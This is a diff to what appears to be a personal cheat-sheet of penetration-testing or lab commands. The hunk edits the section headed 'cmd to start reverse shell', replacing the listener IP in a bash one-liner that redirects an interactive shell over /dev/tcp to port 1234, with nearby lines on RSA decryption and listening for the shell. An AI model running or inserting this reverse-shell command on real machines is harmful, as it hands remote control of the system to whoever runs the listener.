@@ -127,7 +127,7 @@ openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out file.txt
 
 ## cmd to start reverse shell 
 
-bash -i >& /dev/tcp/10.9.46.252/1234 0>&1
+bash -i >& /dev/tcp/10.4.9.144/1234 0>&1
 
 ## listen for reverse shell
 
